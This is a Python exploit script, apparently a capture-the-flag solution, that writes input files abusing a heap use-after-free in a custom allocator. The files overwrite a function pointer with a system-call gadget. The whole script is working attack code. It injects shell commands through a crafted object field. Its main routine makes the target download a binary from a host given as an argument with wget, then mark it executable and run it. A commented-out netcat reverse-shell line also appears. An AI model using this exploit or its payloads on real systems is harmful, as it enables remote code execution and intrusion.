from struct import pack
import sys

def print_stderr(msg):
    sys.stderr.write(msg + "\n")

def exploit(cmd, filename):
    objs = []
    content = ""
    # Objective:
    # Allocate 2 64 bytes buckets and make them full
    # 520 = sizeof(struct bucket)
    # 4096 - 520 = 3576 / 64 = 55
    for n in range(0, 55 * 2):
        obj_id = pack("<h", int(n)).decode()
        objs.append(obj_id)
        # print_stderr("[*] Creating object {}".format(n))
        # Create
        content += "\x10"
        content += obj_id
        content += "\x16\x00"
        content += "\x41" * 20 + "\x00"
        content += "\x42" * 4 + "\x00"
        content += "\n"

    # Status
    # Bucket 1: Fully allocated
    # Bucket 2: Fully allocated (current)

    # Free two allocations from bucket 1
    # Since bucket 2 is current and the traversing doesn't involve the 
    # quarantine mitigation, we can bypass it

    # DELETE (Free)
    content += "\x12"
    content += objs[0]
    content += "\n"

    # DELETE (Free)
    content += "\x12"
    content += objs[1]
    content += "\n"

    # ID & price
    fake_obj = "AA;$({});#".format(cmd)
    #fake_obj += "\x41" * 0x2c
    fake_obj += "\x41" * ( 0x30 - len(fake_obj) )
    # CMD_DROP function pointer
    # @execute_system
    fake_obj += "\x70" + "\x00"

    # Create => alloc bucket1->freelist[1]
    content += "\x10"
    content += "\x37\x13"  # sh
    content += "\x16\x00"
    # Name: system payload
    # content += ";mknod /tmp/mypipe p ; /bin/bash 0< /tmp/mypipe | nc 127.0.0.1 4445 1> /tmp/mypipe\x00"
    content += "BB\x00"
    # Description: alloc on bucket1->freelist[0] (| obj[0])
    content += fake_obj
    content += "\n"

    # DROP => Trigger arbitrary function call
    content += "\x14"
    content += "\x41\x41"
    content += "\n"

    with open(filename, "w") as f:
        f.write(content)
    print_stderr("[+] {} generated".format(filename))

if __name__ == "__main__":
    exploit("wget http://{}:8000/e -O /tmp/e".format(sys.argv[1]), "input_file_1")
    exploit("chmod +x /tmp/e", "input_file_2")
    exploit("/tmp/e", "input_file_3")

